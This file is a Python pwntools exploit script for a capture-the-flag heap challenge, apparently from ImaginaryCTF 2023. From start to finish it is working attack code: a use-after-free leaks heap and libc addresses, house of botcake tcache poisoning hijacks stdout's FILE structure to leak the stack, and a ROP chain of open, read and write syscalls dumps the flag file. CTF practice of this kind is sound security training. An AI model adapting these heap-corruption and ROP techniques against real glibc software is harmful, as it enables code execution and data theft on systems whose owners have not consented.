#!/usr/bin/env python3
from pwn import *
import pwn

# p = remote("form.chal.imaginaryctf.org", "1337")
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
p = elf.process()
context.update(binary=elf, log_level="DEBUG")
# gdb.attach(
#     p,
#     """
#     b *main+483
#     b *main+620
#     b *main+667
#     x/20gx &mem
#     """,
# )


def write_malloc(idx, size, content):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(int(size)).encode())
    p.sendlineafter(b"content: ", content)
    return


def send_free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())
    return


def read_leak(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    leak = p.recvline()
    return leak


# leak heap_base address
write_malloc(0, 0x50, b"A" * 8)
send_free(0)
heap_base = (u64(read_leak(0).strip().ljust(8, b"\x00")) << 12) - 0x2000
log.info("Heap base address: " + hex(heap_base))

# leak libc address | size 0x540 is freed not put in smaller
write_malloc(0, 0x540, b"B" * 8)  # push fastbins into smallbins
write_malloc(1, 0x540, b"C" * 8)
send_free(0)
main_arena96 = u64(read_leak(0).strip().ljust(8, b"\x00"))
libc.address = main_arena96 - 0x219CE0
environ = libc.address + 0x221200
stdout = libc.address + 0x21A780
log.info("LIBC base address: " + hex(libc.address))
log.info("environ:             " + hex(environ))
log.info("stdout:              " + hex(stdout))
send_free(1)

# setup get house of botcake
for i in range(7):
    write_malloc(i, 0x100, b"A" * 8)

write_malloc(7, 0x100, b"B" * 8)
write_malloc(8, 0x100, b"C" * 8)
write_malloc(9, 0x100, b"D" * 8)
for i in range(7):
    send_free(i)
send_free(8)
send_free(7)
write_malloc(6, 0x100, b"E" * 8)  # pop 6 out t-cache, slot for 8
send_free(8)  # put victim 8 in t-cache
key = (heap_base + 0x2000) >> 12
log.info("key value: " + hex(key))
payload = b"A" * 0x108 + p64(0x111) + p64(key ^ stdout)
write_malloc(0, 0x120, payload)
write_malloc(1, 0x100, b"A" * 8)
# fp->_flags = (fp->_flags & ~(_IO_NO_WRITES)) | _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING.
# f->_IO_write_ptr = fp->_IO_write_end = f->_IO_buf_end = &environ + 8.
# fp->_IO_write_base = &environ
payload = b""
payload += p64(0xFBAD1800)  # _flags
payload += p64(environ) * 3  # _IO_read_*
payload += p64(environ)  # _IO_write_base
payload += p64(environ + 0x8) * 2  # _IO_write_ptr + _IO_write_end
payload += p64(environ + 8)  # _IO_buf_base
payload += p64(environ + 8)  # _IO_buf_end
write_malloc(2, 0x100, payload)
stack_addr = u64((p.recv(6).strip()).ljust(8, b"\x00"))
rsp = stack_addr - 0x158
log.info("rsp stack address:      " + hex(rsp))
send_free(1)
send_free(0)
ret_op_malloc = rsp - 0x8
payload = b""
payload += b"B" * 0x108 + p64(0x111) + p64(key ^ (ret_op_malloc - 0x28))
write_malloc(0, 0x120, payload)
write_malloc(1, 0x100, b"A" * 8)
open_libc = libc.symbols["open"]
read_libc = libc.symbols["read"]
write_libc = libc.symbols["write"]
prdi_ret = libc.address + 0x000000000002A3E5  #: pop rdi ; ret
prsi_ret = libc.address + 0x000000000002BE51  #: pop rsi ; ret
prdx_ret = libc.address + 0x000000000011F497  #: pop rdx ; pop r12 ; ret
prax_ret = libc.address + 0x0000000000045EB0  #: pop rax ; ret
syscall = libc.address + 0x91396  #: syscall

rop = b"A" * 0x28
rop += p64(prdi_ret)
rop += p64(ret_op_malloc + 0xB0)
rop += p64(prsi_ret)
rop += p64(0)
rop += p64(prax_ret)
rop += p64(2)
rop += p64(syscall)
rop += p64(prdi_ret)
rop += p64(0x3)
rop += p64(prsi_ret)
rop += p64(heap_base + 0x2010)
rop += p64(prdx_ret)
rop += p64(0x300)
rop += p64(0)
rop += p64(prax_ret)
rop += p64(0)
rop += p64(syscall)
rop += p64(prdi_ret)
rop += p64(1)
rop += p64(prax_ret)
rop += p64(1)
rop += p64(syscall)
rop += b"./flag.txt\x00"
import pwn

find = pwn.ROP(libc, base=rsp)
find.call(find.find_gadget(["syscall", "ret"]))
print(find.dump())
write_malloc(2, 0x100, rop)
# chúng ta sẽ ghi đè lên khung ngăn xếp của bất kỳ hàm lib nào gọi fgets()

p.interactive()
# https://surg.dev/ictf23/
# https://ret2school.github.io/post/mailman/
